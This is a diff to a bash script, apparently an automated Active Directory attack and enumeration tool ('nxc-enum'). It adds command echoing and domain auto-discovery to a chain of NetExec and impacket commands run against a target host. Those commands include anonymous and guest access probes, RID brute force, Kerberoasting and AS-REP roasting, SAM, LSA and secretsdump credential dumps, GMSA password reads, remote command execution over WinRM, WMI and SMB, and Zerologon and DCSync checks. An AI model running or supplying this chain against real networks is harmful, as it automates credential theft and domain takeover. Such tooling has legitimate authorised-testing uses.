@@ -117,6 +117,14 @@ ENDC='\033[0m'
 BOLD='\033[1m'
 UNDERLINE='\033[4m'
 
+# Helper function to print command and separators
+print_cmd() {
+    echo -e "\n\033[90m--------------------------------------------------------------------------------\033[0m" >&2
+    echo -e "\033[90m--------------------------------------------------------------------------------\033[0m" >&2
+    echo -e "\033[94m[*] Executing: $*\033[0m\n" >&2
+}
+
+
 echo -e "\n\033[96m[+] Target OS Type:\033[0m $os_type"
 echo -e "\n\033[96m[+] Logging Enabled:\033[0m `pwd`/nxc-enum\n"
 
@@ -261,6 +269,7 @@ if [ "$os_type" = "windows" ]; then
 
     # LDAP domain SID (requires credentials)
     if [ -n "$user" ]; then
+        print_cmd "nxc ldap $IP $USER_FLAG --get-sid --users"
         unbuffer nxc ldap $IP $USER_FLAG --get-sid --users | tee nxc-enum/ldap/domain-sid.txt
     else
         echo -e "\n\033[93m[!] Skipping LDAP domain SID (no credentials supplied)\033[0m"
@@ -274,8 +283,10 @@ if [ "$os_type" = "windows" ]; then
     # Guest access (domain optional)
     echo -e "\n\033[96m[+] Checking Guest access\033[0m"
     if [ -n "$domain" ]; then
+        print_cmd "nxc smb $IP -d \"$domain\" -u 'guest' -p '' --shares"
         guest_output=$(nxc smb $IP -d "$domain" -u 'guest' -p '' --shares)
     else
+        print_cmd "nxc smb $IP -u 'guest' -p '' --shares"
         guest_output=$(nxc smb $IP -u 'guest' -p '' --shares)
     fi
     echo "$guest_output"
@@ -331,8 +342,10 @@ if [ "$os_type" = "windows" ]; then
     # Anonymous access (domain optional)
     echo -e "\n\033[96m[+] Checking Anonymous access\033[0m"
     if [ -n "$domain" ]; then
+        print_cmd "nxc smb $IP -d \"$domain\" -u '' -p '' --shares"
         anon_output=$(nxc smb $IP -d "$domain" -u '' -p '' --shares)
     else
+        print_cmd "nxc smb $IP -u '' -p '' --shares"
         anon_output=$(nxc smb $IP -u '' -p '' --shares)
     fi
     echo "$anon_output"
@@ -374,6 +387,31 @@ if [ "$os_type" = "windows" ]; then
             echo ""
         fi
     fi
+    
+    # --- Auto-Domain Discovery ---
+    if [ -z "$domain" ]; then
+        # Try to extract DNS domain (priority) or NetBIOS domain from nxc output
+        discovered_domain=$(echo "$guest_output $anon_output" | grep -oP '(?<=domain:)[^\)]+' | head -n1 | tr -d ' ')
+        
+        if [ -n "$discovered_domain" ]; then
+            domain="$discovered_domain"
+            DOMAIN_FLAG="-d $domain"
+            echo -e "\n\033[92m[+] Auto-discovered domain: $domain\033[0m"
+            echo -e "\033[96m[*] Updating flags for subsequent scans (LDAP, RDP, WinRM)...\033[0m"
+            
+            # Re-build RPC/SECRETS arguments that rely on domain
+            if [ -n "$user" ]; then
+                if [ -n "$hash" ]; then
+                    RPC_ARG="-U $domain\\\\$user --pw-nt-hash $hash"
+                    SECRETS_ARG="-hashes :$hash $domain/$user@$IP"
+                elif [ -n "$pass" ]; then
+                    RPC_ARG="-U $domain\\\\$user%$pass"
+                    SECRETS_ARG="$domain/$user:$pass@$IP"
+                fi
+            fi
+        fi
+    fi
+    # ----------------------------
 else
     echo -e "\n\033[93m[!] Skipping Windows-specific Guest/Anonymous SMB checks (target OS: Linux)\033[0m"
 fi
@@ -385,17 +423,21 @@ if [ "$os_type" = "windows" ] || check_port $IP 445 || check_port $IP 139; then
     echo "# Attempting anonymous SID bruteforce to enumerate users..."
     # Try anonymous first
     # Try impacket-lookupsid first
+    print_cmd "impacket-lookupsid -no-pass anonymous@$IP"
     lookupsid_output=$(timeout 30s impacket-lookupsid -no-pass anonymous@$IP 2>/dev/null | tee nxc-enum/smb/lookupsid-anonymous.txt)
     # Fallback to lookupsid.py if failed
     if [ ! -s nxc-enum/smb/lookupsid-anonymous.txt ]; then
+        print_cmd "lookupsid.py -no-pass anonymous@$IP"
         lookupsid_output=$(timeout 30s lookupsid.py -no-pass anonymous@$IP 2>/dev/null | tee nxc-enum/smb/lookupsid-anonymous.txt)
     fi
     
     # If anonymous failed to find users, try guest
     if ! echo "$lookupsid_output" | grep -q "SidTypeUser"; then
         echo -e "\n\033[93m[!] Anonymous lookupsid failed, trying with 'guest' account...\033[0m"
+        print_cmd "impacket-lookupsid -no-pass guest@$IP"
         lookupsid_output=$(timeout 30s impacket-lookupsid -no-pass guest@$IP 2>/dev/null | tee nxc-enum/smb/lookupsid-guest.txt)
         if [ ! -s nxc-enum/smb/lookupsid-guest.txt ]; then
+            print_cmd "lookupsid.py -no-pass guest@$IP"
             lookupsid_output=$(timeout 30s lookupsid.py -no-pass guest@$IP 2>/dev/null | tee nxc-enum/smb/lookupsid-guest.txt)
         fi
         if echo "$lookupsid_output" | grep -q "SidTypeUser"; then
@@ -434,26 +476,32 @@ if [ "$os_type" = "windows" ] || check_port $IP 445 || check_port $IP 139; then
     
     # Alternative Tool 1: NetExec RID Brute (anonymous & guest)
     echo -e "\n\033[96m[+] Trying NetExec RID Brute (anonymous)\033[0m"
+    print_cmd "nxc smb $IP -u '' -p '' --rid-brute"
     nxc_rid_output=$(timeout 15s nxc smb $IP -u '' -p '' --rid-brute 2>/dev/null | tee nxc-enum/smb/nxc-rid-anonymous.txt)
     echo "$nxc_rid_output"
 
     echo -e "\n\033[96m[+] Trying NetExec RID Brute (guest)\033[0m"
     if [ -n "$domain" ]; then
+        print_cmd "nxc smb $IP -d \"$domain\" -u 'guest' -p '' --rid-brute"
         nxc_rid_guest_output=$(timeout 15s nxc smb $IP -d "$domain" -u 'guest' -p '' --rid-brute 2>/dev/null | tee nxc-enum/smb/nxc-rid-guest.txt)
     else
+        print_cmd "nxc smb $IP -u 'guest' -p '' --rid-brute"
         nxc_rid_guest_output=$(timeout 15s nxc smb $IP -u 'guest' -p '' --rid-brute 2>/dev/null | tee nxc-enum/smb/nxc-rid-guest.txt)
     fi
     echo "$nxc_rid_guest_output"
     
     # Alternative Tool 2: rpcclient enumdomusers
     echo -e "\n\033[96m[+] Trying rpcclient enumdomusers (anonymous)\033[0m"
+    print_cmd "rpcclient -U '' -N $IP -c 'enumdomusers'"
     rpcclient_output=$(rpcclient -U '' -N $IP -c 'enumdomusers' 2>/dev/null | tee nxc-enum/smb/rpcclient-enumdomusers.txt)
     echo "$rpcclient_output"
     
     # Alternative Tool 3: samrdump
     echo -e "\n\033[96m[+] Trying samrdump (anonymous)\033[0m"
+    print_cmd "impacket-samrdump $IP"
     samrdump_output=$(timeout 15s impacket-samrdump $IP 2>/dev/null | tee nxc-enum/smb/samrdump-anonymous.txt)
     if [ ! -s nxc-enum/smb/samrdump-anonymous.txt ]; then
+         print_cmd "samrdump.py $IP"
          samrdump_output=$(timeout 15s samrdump.py $IP 2>/dev/null | tee nxc-enum/smb/samrdump-anonymous.txt)
     fi
     echo "$samrdump_output"
@@ -461,6 +509,7 @@ if [ "$os_type" = "windows" ] || check_port $IP 445 || check_port $IP 139; then
     # Alternative Tool 4: enum4linux (if installed)
     if command -v enum4linux &> /dev/null; then
         echo -e "\n\033[96m[+] Trying enum4linux (anonymous)\033[0m"
+        print_cmd "enum4linux -U $IP"
         timeout 30s enum4linux -U $IP 2>/dev/null | tee nxc-enum/smb/enum4linux-users.txt
     fi
 
@@ -468,6 +517,7 @@ if [ "$os_type" = "windows" ] || check_port $IP 445 || check_port $IP 139; then
     if command -v enum4linux-ng &> /dev/null; then
         echo -e "\n\033[96m[+] Trying enum4linux-ng (anonymous - MAX INFO)\033[0m"
         # -A (All), -R (RID Cycle), -d (Detailed)
+        print_cmd "enum4linux-ng -A -R -d $IP"
         timeout 600s enum4linux-ng -A -R -d $IP 2>/dev/null | tee nxc-enum/smb/enum4linux-ng-anonymous.txt
     fi
     
@@ -528,8 +578,10 @@ if [ "$os_type" = "windows" ] || check_port $IP 445 || check_port $IP 139; then
         
         if [ -n "$domain_name" ] && [ "$domain_name" != "DOMAIN" ]; then
             echo "# Using domain: $domain_name"
+            print_cmd "impacket-GetNPUsers \"${domain_name}/\" -usersfile \"$users_file\" -no-pass -dc-ip $IP"
             getnpusers_output=$(impacket-GetNPUsers "${domain_name}/" -usersfile "$users_file" -no-pass -dc-ip $IP 2>/dev/null | tee nxc-enum/smb/asrep-getnpusers.txt)
             if [ -z "$getnpusers_output" ]; then
+                print_cmd "GetNPUsers.py \"${domain_name}/\" -usersfile \"$users_file\" -no-pass -dc-ip $IP"
                 getnpusers_output=$(GetNPUsers.py "${domain_name}/" -usersfile "$users_file" -no-pass -dc-ip $IP 2>/dev/null | tee nxc-enum/smb/asrep-getnpusers.txt)
             fi
             echo "$getnpusers_output"
@@ -572,6 +624,7 @@ fi
 # FTP and LDAP anonymous checks (Windows-specific)
 if [ "$os_type" = "windows" ]; then
     echo -e "\n\033[96m[+] Checking FTP Anonymous access\033[0m"
+    print_cmd "nxc ftp $IP -u 'anonymous' -p 'anonymous' --timeout 2"
     ftp_output=$(timeout 5s nxc ftp $IP -u 'anonymous' -p 'anonymous' --timeout 2)
     echo "$ftp_output"
     
@@ -591,10 +644,12 @@ if [ "$os_type" = "windows" ]; then
     fi
     
     echo -e "\n\033[96m[+] Checking LDAP Anonymous access\033[0m"
+    print_cmd "nxc ldap $IP -u '' -p '' --timeout 2"
     ldap_output=$(timeout 5s nxc ldap $IP -u '' -p '' --timeout 2)
     echo "$ldap_output"
     
     # Check if anonymous LDAP access succeeded (via nxc OR manual check)
+    print_cmd "ldapsearch -x -H ldap://$IP -s base namingContexts"
     verify_ldap_anon=$(ldapsearch -x -H ldap://$IP -s base namingContexts 2>/dev/null)
     
     if echo "$ldap_output" | grep -q "\[+\]" || echo "$verify_ldap_anon" | grep -q "namingContexts"; then
@@ -617,6 +672,7 @@ if [ "$os_type" = "windows" ]; then
         if [ -n "$base_dn" ]; then
             echo "[+] Using Base DN: $base_dn"
             echo "[*] Dumping all objects..."
+            print_cmd "ldapsearch -x -H ldap://$IP -b \"$base_dn\" -s sub \"(objectClass=*)\""
             ldapsearch -x -H ldap://$IP -b "$base_dn" -s sub "(objectClass=*)" > nxc-enum/ldap/ldap-dump-anonymous.txt
             
             if [ -s nxc-enum/ldap/ldap-dump-anonymous.txt ]; then
@@ -647,8 +703,10 @@ if [ "$os_type" = "windows" ]; then
     echo -e "\n\033[96m[+] Checking LDAP Guest access\033[0m"
     # Try with guest account
     if [ -n "$domain" ]; then
+        print_cmd "nxc ldap $IP -d \"$domain\" -u 'guest' -p '' --timeout 2"
         ldap_guest_output=$(timeout 5s nxc ldap $IP -d "$domain" -u 'guest' -p '' --timeout 2)
     else
+        print_cmd "nxc ldap $IP -u 'guest' -p '' --timeout 2"
         ldap_guest_output=$(timeout 5s nxc ldap $IP -u 'guest' -p '' --timeout 2)
     fi
     echo "$ldap_guest_output"
@@ -674,6 +732,7 @@ if [ "$os_type" = "windows" ]; then
             echo "[+] Using Base DN: $base_dn"
             echo "[*] Dumping all objects (as Guest)..."
             # Bind as guest
+            print_cmd "ldapsearch -x -H ldap://$IP -D \"guest\" -w \"\" -b \"$base_dn\" -s sub \"(objectClass=*)\""
             ldapsearch -x -H ldap://$IP -D "guest" -w "" -b "$base_dn" -s sub "(objectClass=*)" > nxc-enum/ldap/ldap-dump-guest.txt
             
             if [ -s nxc-enum/ldap/ldap-dump-guest.txt ]; then
@@ -701,6 +760,7 @@ if [ "$os_type" = "windows" ]; then
 fi
 
 echo -e "\n\033[96m[+] NFS Enumeration (No credentials required)\033[0m"
+print_cmd "nxc nfs $IP --shares"
 nfs_output=$(unbuffer nxc nfs $IP --shares | tee nxc-enum/smb/nfs-shares.txt)
 echo "$nfs_output"
 
@@ -727,8 +787,11 @@ check_and_suggest() {
     service=$1
     shift
     echo "Checking $service..."
+    # Print the command before execution
+    print_cmd "$@"
     # Run the command and capture output
     output=$("$@")
+
     echo "$output"
     
     # Check for success indicator "[+]"
@@ -1029,8 +1092,11 @@ if [ "$os_type" = "windows" ]; then
     # RPC enumeration - works with username only (null password)
     if [ -n "$user" ]; then
         echo -e "\n\033[96m[+] RPC Enumeration (rpcclient)\033[0m\n"
+        print_cmd "rpcclient $RPC_ARG $IP -c \"queryuser 0\""
         rpcclient $RPC_ARG $IP -c "queryuser 0" 2>/dev/null # RPC user query
+        print_cmd "rpcclient $RPC_ARG $IP -c \"enumdomusers\""
         rpcclient $RPC_ARG $IP -c "enumdomusers" 2>/dev/null | tee nxc-enum/smb/rpc-enumdomusers.txt # Enumerate domain users via RPC
+        print_cmd "rpcclient $RPC_ARG $IP -c \"enumdomgroups\""
         rpcclient $RPC_ARG $IP -c "enumdomgroups" 2>/dev/null | tee nxc-enum/smb/rpc-enumdomgroups.txt # Enumerate domain groups via RPC
         
         # Extract usernames to a clean list
@@ -1074,8 +1140,10 @@ if [ "$os_type" = "windows" ]; then
         # secretsdump requires actual credentials
         if [ -n "$pass" ] || [ -n "$hash" ]; then
             echo -e "\n\033[96m[+] RPC Secrets Dump (impacket-secretsdump)\033[0m\n"
+            print_cmd "impacket-secretsdump $SECRETS_ARG"
             impacket-secretsdump $SECRETS_ARG 2>/dev/null | tee nxc-enum/smb/rpc-secretsdump.txt
             if [ ! -s nxc-enum/smb/rpc-secretsdump.txt ]; then
+                print_cmd "secretsdump.py $SECRETS_ARG"
                 secretsdump.py $SECRETS_ARG 2>/dev/null | tee nxc-enum/smb/rpc-secretsdump.txt
             fi
         else
@@ -1087,8 +1155,10 @@ if [ "$os_type" = "windows" ]; then
     
     echo -e "\n\033[96m[+] RPC Endpoint Dump (impacket-rpcdump)\033[0m\n"
     timestamp=$(date +%Y%m%d_%H%M%S)
+    print_cmd "impacket-rpcdump \"$IP\" $RPCDUMP_ARG"
     impacket-rpcdump "$IP" $RPCDUMP_ARG 2>/dev/null > "nxc-enum/rpc_endpoints_${timestamp}.txt"
     if [ ! -s "nxc-enum/rpc_endpoints_${timestamp}.txt" ]; then
+        print_cmd "rpcdump.py \"$IP\" $RPCDUMP_ARG"
         rpcdump.py "$IP" $RPCDUMP_ARG 2>/dev/null > "nxc-enum/rpc_endpoints_${timestamp}.txt"
     fi
     echo "# Results saved to: nxc-enum/rpc_endpoints_${timestamp}.txt"
@@ -1100,6 +1170,7 @@ if [ "$os_type" = "windows" ]; then
             check_and_suggest winrm nxc winrm $IP $DOMAIN_FLAG $USER_FLAG | tee nxc-enum/smb/winrm-credentials.txt
         
             echo -e "\n\033[91m[+] WinRM Command Execution (whoami)\033[0m\n"
+            print_cmd "nxc winrm $IP $DOMAIN_FLAG $USER_FLAG -x whoami"
             unbuffer nxc winrm $IP $DOMAIN_FLAG $USER_FLAG -x whoami | tee nxc-enum/smb/winrm-whoami.txt
         else
             echo -e "\n\033[93m[!] Skipping WinRM check (Ports 5985/5986 closed)\033[0m"
@@ -1113,27 +1184,37 @@ if [ "$os_type" = "windows" ]; then
     
     if [ -n "$user" ]; then
         echo -e "\n\033[96m[+] Enumerating logged users\033[0m\n"
+        print_cmd "nxc smb $IP $USER_FLAG --loggedon-users"
         unbuffer nxc smb $IP $USER_FLAG --loggedon-users 2>/dev/null | tee nxc-enum/smb/logged-users.txt
     
         echo -e "\n\033[96m[+] Enumerating Admin users\033[0m\n"
+        print_cmd "nxc ldap $IP $USER_FLAG --users --admin-count"
         unbuffer nxc ldap $IP $USER_FLAG --users --admin-count 2>/dev/null | tee nxc-enum/ldap/admin-count-users.txt
     
         echo -e "\n\033[96m[+] Enumerating domain users by bruteforcing RID\033[0m\n"
+        print_cmd "nxc smb $IP $USER_FLAG --rid-brute"
         unbuffer nxc smb $IP $USER_FLAG --rid-brute 2>/dev/null | tee nxc-enum/smb/rid-bruteforce.txt
     
         echo -e "\n\033[96m[+] Enumerating domain groups\033[0m\n"
+        print_cmd "nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --groups"
         unbuffer nxc ldap $IP $DOMAIN_FLAG $USER_FLAG --groups 2>/dev/null | tee nxc-enum/smb/domain-groups.txt
     
         echo -e "\n\033[96m[+] Enumerating local groups\033[0m\n"
+        print_cmd "nxc smb $IP $USER_FLAG --local-groups"
         unbuffer nxc smb $IP $USER_FLAG --local-groups 2>/dev/null | tee nxc-enum/smb/local-groups.txt
     
         echo -e "\n\033[96m[+] Dumping password policy\033[0m\n"
+        print_cmd "nxc smb $IP $USER_FLAG --pass-pol"
         unbuffer nxc smb $IP $USER_FLAG --pass-pol 2>/dev/null | tee nxc-enum/smb/pw-policy.txt
     
         echo -e "\n\033[96m[+] Trying to execute commands:\033[0m\n"
+        print_cmd "nxc smb $IP $USER_FLAG -x whoami"
         nxc smb $IP $USER_FLAG -x whoami 2>/dev/null
+        print_cmd "nxc smb $IP $USER_FLAG -X '\$PSVersionTable'"
         nxc smb $IP $USER_FLAG -X '$PSVersionTable' 2>/dev/null
+        print_cmd "nxc wmi $IP $USER_FLAG -x whoami"
         nxc wmi $IP $USER_FLAG -x whoami 2>/dev/null
+        print_cmd "nxc winrm $IP $USER_FLAG -x whoami"
         nxc winrm $IP $USER_FLAG -x whoami 2>/dev/null
     else
         echo -e "\n\033[93m[!] Skipping User/Group Enumeration & Command Execution (no username supplied)\033[0m"
@@ -1142,9 +1223,11 @@ if [ "$os_type" = "windows" ]; then
     # LDAP modules require actual authentication - skip if no password/hash
     if [ -n "$user" ] && { [ -n "$pass" ] || [ -n "$hash" ]; }; then
         echo -e "\n\033[91m[+] GMSA Passwords:\033[0m\n"
+        print_cmd "nxc ldap $IP $USER_FLAG --users --gmsa"
         unbuffer nxc ldap $IP $USER_FLAG --users --gmsa 2>/dev/null | tee nxc-enum/ldap/gmsa.txt  
     
         echo -e "\n\033[91m[+] Checking Anti Virus:\033[0m\n"
+        print_cmd "nxc smb $IP $USER_FLAG -M enum_av"
         unbuffer nxc smb $IP $USER_FLAG -M enum_av 2>/dev/null | tee nxc-enum/ldap/anti_virus.txt  
     
         echo -e "\n\033[96m[+] LDAP Module Enumeration:\033[0m"
@@ -1159,8 +1242,10 @@ if [ "$os_type" = "windows" ]; then
         fi
         
         if [ -n "$pass" ]; then
+            print_cmd "ldapdomaindump -u \"$ldd_user\" -p \"$pass\" -o nxc-enum/ldap/ldd ldap://$IP"
             unbuffer ldapdomaindump -u "$ldd_user" -p "$pass" -o nxc-enum/ldap/ldd ldap://$IP | tee nxc-enum/ldap/ldapdomaindump.log
         elif [ -n "$hash" ]; then
+            print_cmd "ldapdomaindump -u \"$ldd_user\" -p \"$hash\" -o nxc-enum/ldap/ldd ldap://$IP"
             unbuffer ldapdomaindump -u "$ldd_user" -p "$hash" -o nxc-enum/ldap/ldd ldap://$IP | tee nxc-enum/ldap/ldapdomaindump.log
         fi
 
@@ -1169,21 +1254,27 @@ if [ "$os_type" = "windows" ]; then
         fi
     
         echo -e "\n\033[91m[+] Machine Account Quota (maq)\033[0m\n"
+        print_cmd "nxc ldap $IP $USER_FLAG --users -M maq"
         unbuffer nxc ldap $IP $USER_FLAG --users -M maq 2>/dev/null | tee nxc-enum/ldap/maq.txt
     
         echo -e "\n\033[91m[+] ADCS Templates\033[0m\n"
+        print_cmd "nxc ldap $IP $USER_FLAG --users -M adcs"
         unbuffer nxc ldap $IP $USER_FLAG --users -M adcs 2>/dev/null | tee nxc-enum/ldap/adcs.txt
     
         echo -e "\n\033[91m[+] User Description\033[0m\n"
+        print_cmd "nxc ldap $IP $USER_FLAG --users -M get-desc-users"
         unbuffer nxc ldap $IP $USER_FLAG --users -M get-desc-users 2>/dev/null | tee nxc-enum/ldap/desc-users.txt
     
         echo -e "\n\033[91m[+] LDAP Checker\033[0m\n"
+        print_cmd "nxc ldap $IP $USER_FLAG --users -M ldap-checker"
         unbuffer nxc ldap $IP $USER_FLAG --users -M ldap-checker 2>/dev/null | tee nxc-enum/ldap/ldap-checker.txt
     
         echo -e "\n\033[91m[+] Password Not Required\033[0m\n"
+        print_cmd "nxc ldap $IP $USER_FLAG --users --password-not-required"
         unbuffer nxc ldap $IP $USER_FLAG --users --password-not-required 2>/dev/null | tee nxc-enum/ldap/password-not-required.txt
     
         echo -e "\n\033[91m[+] Trusted For Delegation\033[0m\n"
+        print_cmd "nxc ldap $IP $USER_FLAG --users --trusted-for-delegation"
         unbuffer nxc ldap $IP $USER_FLAG --users --trusted-for-delegation 2>/dev/null | tee nxc-enum/ldap/trusted-for-delegation.txt
     
         echo -e "\n\033[91m[+] Kerberoasting\033[0m\n"
@@ -1199,6 +1290,7 @@ if [ "$os_type" = "windows" ]; then
              fi
              
              # Run certipy find
+             print_cmd "$certipy_cmd -dc-ip $IP -vulnerable -stdout"
              eval "$certipy_cmd -dc-ip $IP -vulnerable -stdout 2>/dev/null" | tee nxc-enum/ldap/certipy_output.txt
              
              if [ -s nxc-enum/ldap/certipy_output.txt ]; then
@@ -1217,6 +1309,7 @@ if [ "$os_type" = "windows" ]; then
         fi
 
         rm -f nxc-enum/ldap/kerberoasting.txt kerberoasting.txt 2>/dev/null
+        print_cmd "nxc ldap $IP $USER_FLAG --kdcHost $IP --kerberoasting nxc-enum/ldap/kerberoasting.txt"
         unbuffer nxc ldap $IP $USER_FLAG --kdcHost $IP --kerberoasting nxc-enum/ldap/kerberoasting.txt 2>/dev/null
         if [ -s nxc-enum/ldap/kerberoasting.txt ] && grep -q 'krb5tgs' nxc-enum/ldap/kerberoasting.txt 2>/dev/null; then
             cp nxc-enum/ldap/kerberoasting.txt ./kerberoasting.txt
@@ -1244,6 +1337,7 @@ if [ "$os_type" = "windows" ]; then
     
         echo -e "\n\033[91m[+] AS-REProasting\033[0m\n"
         rm -f nxc-enum/ldap/asreproasting.txt asreproasting.txt 2>/dev/null
+        print_cmd "nxc ldap $IP $USER_FLAG --kdcHost $IP --asreproast nxc-enum/ldap/asreproasting.txt"
         unbuffer nxc ldap $IP $USER_FLAG --kdcHost $IP --asreproast nxc-enum/ldap/asreproasting.txt 2>/dev/null
         if [ -s nxc-enum/ldap/asreproasting.txt ] && grep -q 'krb5asrep' nxc-enum/ldap/asreproasting.txt 2>/dev/null; then
             cp nxc-enum/ldap/asreproasting.txt ./asreproasting.txt
@@ -1271,6 +1365,7 @@ if [ "$os_type" = "windows" ]; then
         
         echo -e "\n\033[91m[+] BloodHound Data Collection\033[0m\n"
         echo "[*] Collecting all data (-c all)..."
+        print_cmd "nxc ldap $IP $USER_FLAG --bloodhound -c all --dns-server $IP"
         bh_output=$(unbuffer nxc ldap $IP $USER_FLAG --bloodhound -c all --dns-server $IP 2>&1 | tee nxc-enum/ldap/bloodhound-collection.txt)
         echo "$bh_output"
         
@@ -1287,14 +1382,17 @@ if [ "$os_type" = "windows" ]; then
     
     if [ -n "$user" ]; then
         echo -e "\n\033[91m[+] Domain Controllers\033[0m\n"
+        print_cmd "nxc ldap $IP $USER_FLAG --dc-list"
         unbuffer nxc ldap $IP $USER_FLAG --dc-list | tee nxc-enum/ldap/domain-controllers.txt
     
         echo -e "\n\033[96m[+] SMB Module Enumeration:\033[0m"
     
         echo -e "\n\033[91m[+] Spider Plus (Find Interesting Files)\033[0m\n"
+        print_cmd "nxc smb $IP $USER_FLAG -M spider_plus --timeout 10"
         timeout 60s unbuffer nxc smb $IP $USER_FLAG -M spider_plus --timeout 10 | tee nxc-enum/smb/spider-plus.txt
     
         echo -e "\n\033[91m[+] Check Zerologon Vulnerability\033[0m\n"
+        print_cmd "nxc smb $IP $USER_FLAG -M zerologon --timeout 5"
         zerologon_output=$(timeout 30s unbuffer nxc smb $IP $USER_FLAG -M zerologon --timeout 5 | tee nxc-enum/smb/zerologon.txt)
         echo "$zerologon_output"
         
@@ -1327,12 +1425,15 @@ if [ "$os_type" = "windows" ]; then
     
         if check_port $IP 1433 "MSSQL"; then
             echo -e "\n\033[91m[+] MSSQL Info\033[0m\n"
+            print_cmd "nxc mssql $IP $USER_FLAG"
             unbuffer nxc mssql $IP $USER_FLAG | tee nxc-enum/smb/mssql-info.txt
         
             echo -e "\n\033[91m[+] MSSQL Query (xp_dirtree)\033[0m\n"
+            print_cmd "nxc mssql $IP $USER_FLAG -x 'EXEC xp_dirtree \"C:\\\\\", 1;'"
             unbuffer nxc mssql $IP $USER_FLAG -x 'EXEC xp_dirtree "C:\\", 1;' | tee nxc-enum/smb/mssql-xp-dirtree.txt
         
             echo -e "\n\033[91m[+] MSSQL Query (sp_databases)\033[0m\n"
+            print_cmd "nxc mssql $IP $USER_FLAG -x 'EXEC sp_databases;'"
             unbuffer nxc mssql $IP $USER_FLAG -x 'EXEC sp_databases;' | tee nxc-enum/smb/mssql-databases.txt
         fi
         
@@ -1341,6 +1442,7 @@ if [ "$os_type" = "windows" ]; then
         echo -e "\n\033[91m[+] VNC Credentials Check\033[0m\n"
         # VNC doesn't support hash authentication, only password
         if [ -n "$pass" ]; then
+            print_cmd "nxc vnc $IP -u \"$user\" -p \"$pass\""
             timeout 5s unbuffer nxc vnc $IP -u "$user" -p "$pass" | tee nxc-enum/smb/vnc-credentials.txt
         else
             echo -e "\033[93m[!] Skipping VNC check (VNC requires password, not hash)\033[0m"
@@ -1354,6 +1456,7 @@ if [ "$os_type" = "windows" ]; then
              check_and_suggest wmi nxc wmi $IP $USER_FLAG | tee nxc-enum/smb/wmi-credentials.txt
     
              echo -e "\n\033[91m[+] WMI Command Execution (whoami)\033[0m\n"
+             print_cmd "nxc wmi $IP $USER_FLAG -x whoami"
              unbuffer nxc wmi $IP $USER_FLAG -x whoami | tee nxc-enum/smb/wmi-whoami.txt
         else
              echo -e "\n\033[93m[!] Skipping WMI check (Port 135 closed)\033[0m"
@@ -1362,9 +1465,11 @@ if [ "$os_type" = "windows" ]; then
         echo -e "\n\033[96m[+] SMB Additional Enumeration:\033[0m"
     
         echo -e "\n\033[91m[+] SAM Hashes Dump\033[0m\n"
+        print_cmd "nxc smb $IP $USER_FLAG --sam"
         unbuffer nxc smb $IP $USER_FLAG --sam | tee nxc-enum/smb/sam-hashes.txt
     
         echo -e "\n\033[91m[+] LSA Secrets Dump\033[0m\n"
+        print_cmd "nxc smb $IP $USER_FLAG --lsa"
         unbuffer nxc smb $IP $USER_FLAG --lsa | tee nxc-enum/smb/lsa-secrets.txt
 
         # enum4linux-ng Authenticated Scan
@@ -1372,8 +1477,10 @@ if [ "$os_type" = "windows" ]; then
             echo -e "\n\033[96m[+] Running enum4linux-ng (Authenticated - MAX INFO)\033[0m"
             echo "    Running with -A (All), -R (RID Cycle), -d (Detailed)"
             if [ -n "$hash" ]; then
+                print_cmd "enum4linux-ng -u \"$user\" -H \"$hash\" -A -R -d $IP"
                 timeout 600s enum4linux-ng -u "$user" -H "$hash" -A -R -d $IP 2>/dev/null | tee nxc-enum/smb/enum4linux-ng-auth.txt
             elif [ -n "$pass" ]; then
+                print_cmd "enum4linux-ng -u \"$user\" -p \"$pass\" -A -R -d $IP"
                 timeout 600s enum4linux-ng -u "$user" -p "$pass" -A -R -d $IP 2>/dev/null | tee nxc-enum/smb/enum4linux-ng-auth.txt
             fi
         fi
@@ -1393,6 +1500,7 @@ if [ -n "$user" ]; then
     # SSH doesn't support hash authentication
     if [ -n "$pass" ]; then
         if check_port $IP 22 "SSH"; then
+            print_cmd "nxc ssh $IP -u \"$user\" -p \"$pass\""
             ssh_output=$(unbuffer nxc ssh $IP -u "$user" -p "$pass" | tee nxc-enum/smb/ssh-credentials.txt)
             echo "$ssh_output"
             
@@ -1419,6 +1527,7 @@ if [ -n "$user" ]; then
     echo -e "\n\033[91m[+] SSH Command Execution (whoami)\033[0m\n"
     if [ -n "$pass" ]; then
         if check_port $IP 22; then
+            print_cmd "nxc ssh $IP -u \"$user\" -p \"$pass\" -x \"whoami\""
             unbuffer nxc ssh $IP -u "$user" -p "$pass" -x "whoami" | tee nxc-enum/smb/ssh-whoami.txt
         fi
     else
@@ -1431,6 +1540,7 @@ if [ -n "$user" ]; then
     # FTP doesn't support hash authentication
     if [ -n "$pass" ]; then
         if check_port $IP 21 "FTP"; then
+            print_cmd "nxc ftp $IP -u \"$user\" -p \"$pass\""
             timeout 5s unbuffer nxc ftp $IP -u "$user" -p "$pass" | tee nxc-enum/smb/ftp-credentials.txt
             
             # Suggest manual FTP/NC connection
@@ -1446,6 +1556,7 @@ if [ -n "$user" ]; then
     echo -e "\n\033[91m[+] FTP Share Enumeration\033[0m\n"
     if [ -n "$pass" ]; then
         if check_port $IP 21; then
+            print_cmd "nxc ftp $IP -u \"$user\" -p \"$pass\" --ls"
             timeout 5s unbuffer nxc ftp $IP -u "$user" -p "$pass" --ls | tee nxc-enum/smb/ftp-shares.txt
         fi
     else
@@ -1462,6 +1573,7 @@ if check_port $IP 21; then
     
     # Grab banner
     echo "# FTP Banner:"
+    print_cmd "nc -nv $IP 21"
     ftp_banner=$(timeout 2 nc -nv $IP 21 2>/dev/null)
     echo "$ftp_banner"
     
@@ -1515,6 +1627,7 @@ if check_port $IP 23; then
     echo "nc -nv $IP 23"
     echo ""
     echo "# Banner grab:"
+    print_cmd "nc -nv $IP 23"
     timeout 2 nc -nv $IP 23
     echo ""
 else
@@ -1528,6 +1641,7 @@ if [ "$os_type" = "windows" ] && [ -n "$user" ] && { [ -n "$pass" ] || [ -n "$ha
     echo -e "\n\033[96m[+] Advanced DACL Enumeration:\033[0m"
     
     echo -e "\n\033[91m[+] Administrator's ACE\033[0m\n"
+    print_cmd "nxc ldap $IP $USER_FLAG -M daclread -o TARGET=Administrator ACTION=read"
     unbuffer nxc ldap $IP $USER_FLAG -M daclread -o TARGET=Administrator ACTION=read 2>/dev/null | tee nxc-enum/ldap/admin-ace.txt
     
     # Build domain DN from domain name
@@ -1536,6 +1650,7 @@ if [ "$os_type" = "windows" ] && [ -n "$user" ] && { [ -n "$pass" ] || [ -n "$ha
         domain_dn=$(echo "$domain" | sed 's/\./,DC=/g' | sed 's/^/DC=/')
         
         echo -e "\n\033[91m[+] DCSync Rights\033[0m\n"
